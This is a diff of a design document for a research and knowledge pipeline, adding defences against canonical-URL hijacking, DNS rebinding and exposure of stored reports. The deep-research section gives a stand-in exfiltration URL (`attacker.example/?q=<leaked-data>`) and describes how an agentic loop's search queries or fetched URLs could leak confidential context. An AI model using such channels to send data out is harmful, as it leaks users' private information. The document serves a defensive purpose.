@@ -285,7 +285,12 @@ Before deduplication:
 - Remove known tracking parameters (`utm_*`, `gclid`, `fbclid`) while preserving
   content-identifying query parameters.
 - Prefer an accessible canonical link only when it resolves to a public HTTP(S)
-  location.
+  location **on the same registrable domain as the page declaring it** — a page
+  cannot canonicalize to another site. Without this, an attacker-controlled page
+  could declare `rel=canonical` pointing at a trusted URL and collide `docHash`
+  with (or hijack `sourceAuthority`/`primarySourceId` for) a legitimate document.
+- §8.1's official/trusted-domain authority check applies to the *final* resolved
+  canonical URL, not the originally discovered one.
 - Hash `kind + canonicalUrl` for the stable document identity.
 
 Exact URL duplicates are removed before model work. Near-duplicate news about the
@@ -306,7 +311,10 @@ Every search result and custom URL goes through the same fetch policy:
 
 - HTTP(S) only.
 - Reject private, loopback, link-local, multicast, reserved, and metadata-service
-  addresses on the initial host and every redirect.
+  addresses on the initial host and every redirect. The connection is made to the
+  specific IP validated for that hop, not a fresh DNS resolution at connect time —
+  otherwise a DNS-rebinding response between validation and connect could still
+  route the request to a rejected address.
 - Ten-second connection/read timeout, two retries with exponential backoff for
   transient network and 5xx failures.
 - Maximum compressed response and decoded-body sizes.
@@ -553,14 +561,20 @@ conditional updates target the canonical row:
    **and** `publishedContentHash` exists (genuinely published, not idle-after-
    rejection), upsert its per-source row from the current published state. If
    `contentHash == publishedContentHash`, stop (§8.2 step 3).
-2. **Claim**: conditional update requiring `qualityStatus = PUBLISHED` AND
-   `(attribute_not_exists(publishedContentHash) OR publishedContentHash <>
-   contentHash)` — the explicit `attribute_not_exists` branch matters: DynamoDB's
-   `<>` against a missing attribute evaluates false, so a doc whose only attempt
-   was ever rejected (no `publishedContentHash` set) would otherwise never be
-   claimable again. On success: `candidateContentHash`, `qualityStatus: ENRICHING`,
-   `claimedAt: now`; if no row exists yet, also set `primarySourceId` to this
-   worker's `sourceId` (immutable from here on). Losers stop before calling Opus.
+2. **Claim**: the condition depends on whether the canonical row exists yet —
+   requiring `qualityStatus = PUBLISHED` unconditionally would make a brand-new
+   `docHash` (no row, so no `qualityStatus` attribute either) permanently
+   unclaimable, since a comparison against a missing attribute evaluates false.
+   - New row (`PutItem`): conditioned on `attribute_not_exists(PK)`. Sets
+     `candidateContentHash`, `qualityStatus: ENRICHING`, `claimedAt: now`,
+     `primarySourceId` (immutable from here on).
+   - Existing row (`UpdateItem`): conditioned on `qualityStatus = PUBLISHED AND
+     (attribute_not_exists(publishedContentHash) OR publishedContentHash <>
+     contentHash)` — the explicit `attribute_not_exists` branch matters here too:
+     a doc whose only attempt was ever rejected has no `publishedContentHash` set,
+     and would otherwise never be claimable again. Sets `candidateContentHash`,
+     `qualityStatus: ENRICHING`, `claimedAt: now`.
+   Losers of either write stop before calling Opus.
 3. Winner calls Opus, stages JSON + Markdown at the `{contentHash}-{claimedAt}`
    keys.
 4. **Quality gate** (§7.2) runs.
@@ -579,23 +593,36 @@ conditional updates target the canonical row:
       repeat from (a) with the new values.
    d. `PROMOTING -> PUBLISHED`, `publishedContentHash: H`,
       `postPublishPending: true`, clearing `candidateContentHash`/`claimedAt`/
-      `promotingAt`, conditioned on `candidateContentHash == H`;
+      `promotingAt`, conditioned on `candidateContentHash == H AND claimedAt ==
+      A` — both, not just `H`: a fencing token that changed since (a) means a
+      newer claim has taken over and this commit must not land, even if `H`
+      happens to still match.
       retry from (a) on conflict.
 8. **Fan out**: upsert every `discoveredBySourceIds` row with the published
    summary/`keyTakeaways`/`qualityStatus`/`s3Key`.
 9. Trigger KB ingestion, then clear `postPublishPending`.
 
 A row stuck in `ENRICHING`/`PROMOTING` past a short lease (e.g. 10 minutes, same
-pattern as §11.3's `CLAIMED` reclaim) means the claim holder crashed.
-Reconciliation renews the lease (`claimedAt: old -> now`, conditioned on the stale
-value) before acting — this also mints a fresh fencing token, so the original
-worker's now-orphaned staging write (if it still lands) never gets promoted:
+pattern as §11.3's `CLAIMED` reclaim) means the claim holder crashed. The two
+states need different reconciliation, not the same lease-renewal treatment:
 
-- **Stuck `ENRICHING`**: bodies aren't retained (§6.3) and SHA-256 is one-way, so
-  reconciliation must re-fetch and re-verify `contentHash` against
-  `candidateContentHash` before redoing enrichment; on mismatch, roll back (as
-  step 6, no rejection reason) and let the next fetch claim fresh.
-- **Stuck `PROMOTING`**: re-enter the promote loop (step 7) — already idempotent.
+- **Stuck `ENRICHING`**: enrichment (the Opus call) is not idempotent, so
+  reconciliation renews the lease (`claimedAt: old -> now`, conditioned on the
+  stale value) and mints a fresh fencing token before redoing it — an orphaned
+  original worker that later reaches step 5 or 7d finds `claimedAt` no longer
+  matches what it remembers and is blocked. Bodies aren't retained (§6.3) and
+  SHA-256 is one-way, so reconciliation must re-fetch and re-verify `contentHash`
+  against `candidateContentHash`; on mismatch, roll back (as step 6, no rejection
+  reason) and let the next fetch claim fresh.
+- **Stuck `PROMOTING`**: promote (step 7) is already an idempotent copy +
+  conditional write — reconciliation must *not* renew `claimedAt` here.
+  Minting a new token would orphan the fencing itself: the staged artifact only
+  exists at the *original* `{H}-{A}` key, so a renewed token would make step 7a
+  chase a key nothing was ever written to. Reconciliation instead re-enters the
+  promote loop using the row's existing, unchanged `candidateContentHash`/
+  `claimedAt` — safe to run concurrently with a merely-slow original worker,
+  since both would copy identical bytes and only one conditional `PUBLISHED`
+  write can win.
 - **`postPublishPending: true` past the same lease, regardless of `qualityStatus`**:
   re-run steps 8-9 for that row. This is not a live claim (no lease conflict to
   guard) — a crash between step 7d's commit and step 9's ingestion trigger would
@@ -829,7 +856,10 @@ Deep research is a single iterative agentic loop (`web_search`/`fetch_page`/
 public-then-synthesis call — the same reasoning that picks the next search has
 `approvedPlan`'s internal context in its window. `web_search` query arguments are
 checked server-side against §6.1's approved-alias/generic-topic allowlist before
-dispatch. That check does not cover `fetch_page`: a URL's query string, path, and
+dispatch — the whole query string must tokenize into allowed terms only, not
+merely contain one; a query that also carries extra, non-allowlisted text (a
+possible exfiltration suffix) is rejected outright. That check does not cover
+`fetch_page`: a URL's query string, path, and
 even destination host are an exfiltration channel an alias-token match doesn't
 catch (`https://attacker.example/?q=<leaked-data>` can pass an alias check while
 still leaking arbitrary text). `fetch_page` therefore only accepts an opaque
@@ -923,39 +953,46 @@ research/{userId}/{researchId}/report.json
 research/{userId}/{researchId}/report.md
 ```
 
-They must never be written to `shared/research/`. Today, three deployed writers
-still do:
+They must never be written to `shared/research/`. Today, three writers and two
+readers still touch that prefix — redirecting only the writers breaks the readers:
 
-- `backend/internal/service/research.go` (`api` Lambda, `TtobakGatewayStack`).
-- `backend/python/research-tools/save_report.py` — a CDK Lambda
-  (`ttobak-research-save-report`, `infra/lib/research-agent-stack.ts`) despite the
-  script-like name, invoked as a Bedrock Agent action-group tool. `toolsRole` has
-  only `kbBucket.grantReadWrite` and reads `KB_BUCKET_NAME` — no assets-bucket
-  grant/env var yet.
-- `backend/python/research-agent/tools.py` — the AgentCore Runtime container,
+- **Writers**: `backend/internal/service/research.go` (`api` Lambda,
+  `TtobakGatewayStack`); `backend/python/research-tools/save_report.py` — a CDK
+  Lambda (`ttobak-research-save-report`, `infra/lib/research-agent-stack.ts`)
+  despite the script-like name, invoked as a Bedrock Agent action-group tool;
+  `backend/python/research-agent/tools.py` — the AgentCore Runtime container,
   genuinely outside CDK (`deploy-research-agent.yml`).
+- **Readers** (miss these and the detail API / follow-up research break once
+  writers move): `research.go`'s own `GetObject` (same file, same Lambda) reads
+  the report back to serve it; `research-agent/agent.py`'s parent-report lookup
+  reads a prior research's Markdown when a follow-up references it.
 
 This exposure predates this design and shouldn't wait on Phase 4. Closing it, in
 Phase 1:
 
-1. **Redirect all three writers** to the owner-scoped keys above — otherwise
-   backlog remediation just gets refilled by the same code. Deploys:
-   `TtobakGatewayStack` (`research.go`); `TtobakResearchAgentStack` (grant
-   `research/*` on the assets bucket to `toolsRole`, remove its now-unneeded
-   `shared/research/*` grant, swap `save_report.py`'s env var). The AgentCore
-   Runtime container's IAM comes from `TtobakAiStack`'s `fromRoleArn` import of
-   `ttobak-agentcore-research-role` (CLAUDE.md) — `deploy-research-agent.yml`
-   only consumes that role via `--role-arn`, it does not attach policy, so the
-   `research/*` grant for this writer is an `AiStack` change, not a workflow run.
+1. **Redirect every writer and reader above** to the owner-scoped keys — otherwise
+   backlog remediation just gets refilled by the same code, or a working reader
+   breaks. IAM: `research-agent-stack.ts` grants `research/*` on the assets bucket
+   to `toolsRole` (the tool Lambdas' role — `save_report`/`fetch_page`, already
+   bucket-wide on the KB bucket via `kbBucket.grantReadWrite`, unaffected) and
+   removes the now-unneeded `shared/research/*` prefix grant from `agentRole`
+   (the Bedrock Agent's own execution role, not `toolsRole` — a different
+   role holds that specific grant). The AgentCore Runtime container's IAM comes
+   from `TtobakAiStack`'s `fromRoleArn` import of `ttobak-agentcore-research-role`
+   (CLAUDE.md) — `deploy-research-agent.yml` only consumes that role via
+   `--role-arn`, it does not attach policy, so the `research/*` grant for this
+   writer/reader is an `AiStack` change, not a workflow run. Env vars: `research.go`
+   and `agent.py`'s report path both move together (same deploy each).
 2. **Migrate the backlog** to owner-scoped storage (or confirm/keep only
    public-material reports).
 3. **Clear the vector index** — deleting/moving S3 objects doesn't remove
    already-ingested vectors. Re-run KB ingestion on `shared/research/` after step
    2; verify via a zero-hit retrieval query, not just an empty S3 prefix.
 
-Phase 4 only needs to confirm all three are in place, since Phase 1 will already
-have closed the writer path and cleared the backlog. Account sharing continues
-through the existing account/document access checks, not a globally retrievable KB
+Phase 4 only needs to confirm all of the above are in place, since Phase 1 will
+already have closed the writer/reader paths and cleared the backlog. Account
+sharing continues through the existing account/document access checks, not a
+globally retrievable KB
 prefix.
 
 ## 13. Rendering and UX
@@ -1147,7 +1184,9 @@ and failover are a separate higher-tier requirement.
   with 35-day retention for an independently scheduled 24-hour checkpoint.
 - Both assets and KB buckets remain versioned. Two separate controls, different
   buckets/stacks:
-  - **Assets bucket** (`TtobakStorageStack`): 7-day lifecycle on
+  - **Assets bucket** (`TtobakStorageStack`): a `noncurrentVersionExpiration` rule
+    (not a current-version delete rule — the bucket is versioned, so a bare
+    expiration would leave noncurrent versions behind forever) at 7 days on
     `knowledge-artifacts/staging/` only (§9.1) — the promoted `knowledge-artifacts/
     promoted/` copy is excluded and long-term. Deployable now.
   - **KB bucket** (`TtobakKnowledgeStack`): 35-day noncurrent retention on the
@@ -1169,7 +1208,12 @@ and failover are a separate higher-tier requirement.
 1. Deploy the last known-good CDK application without deploying the staged
    KnowledgeStack teardown.
 2. Restore `ttobak-main` from PITR or the daily recovery point to a new table.
-3. Validate item counts and switch stack configuration to the restored table.
+3. Validate item counts and switch stack configuration to the restored table —
+   **unresolved**: `storage-stack.ts` creates `ttobak-main` directly and every
+   other stack references it by that fixed name; there is no table-import
+   parameter today, so this step has no CDK mechanism yet. The 24h RTO in §17.1
+   depends on this step; resolving it (table-name context parameter, or an
+   import path) is an implementation-time decision, not settled by this design.
 4. Recover required S3 object versions.
 5. Rebuild/ingest the Bedrock KB from canonical Markdown.
 6. Reconcile vocabulary active names with Transcribe and rebuild missing versions.
@@ -1187,8 +1231,8 @@ regional Bedrock/SES dependencies, and a traffic failover plan.
 Add table-driven `unittest` coverage for:
 
 - query expansion and confidential-context exclusion;
-- URL canonicalization, redirects, SSRF checks, body limits, and paywall/JS shell
-  rejection;
+- URL canonicalization, redirects, SSRF checks (including DNS-rebinding between
+  validation and connect), body limits, and paywall/JS shell rejection;
 - mandatory full-fetch behavior for search and custom URLs;
 - no writes when fetch, schema, relevance, or quality fails;
 - exact dedup and near-duplicate event grouping;
@@ -1247,12 +1291,12 @@ No text, control, badge, diagram, or table may overlap or expand a fixed control
 - Store private JSON + canonical KB Markdown.
 - Upgrade insight list/detail UX.
 - Add metrics, alarms, cost budgets, and legacy migration.
-- Remediate existing `shared/research/` exposure (§12.4), all three parts:
-  redirect all three writers — `research.go` (`TtobakGatewayStack`),
-  `save_report.py` (`TtobakResearchAgentStack`), and the AgentCore Runtime
-  container (IAM via `TtobakAiStack`'s existing role import) — to owner-scoped
-  storage, migrate the already-published backlog, and re-run KB ingestion to
-  clear already-indexed
+- Remediate existing `shared/research/` exposure (§12.4): redirect all three
+  writers and both readers — `research.go` (`TtobakGatewayStack`, writer and
+  reader both), `save_report.py` (`TtobakResearchAgentStack`), and the AgentCore
+  Runtime container's `tools.py`/`agent.py` (writer and parent-report reader; IAM
+  via `TtobakAiStack`'s existing role import) — to owner-scoped storage, migrate
+  the already-published backlog, and re-run KB ingestion to clear already-indexed
   vectors. This is independent of Phase 4's research/prep *features* — it fixes a
   pre-existing exposure, not a Phase 4 regression, so it does not wait for Phase 4,
   even though it touches stacks/pipelines Phase 1's other bullets don't otherwise
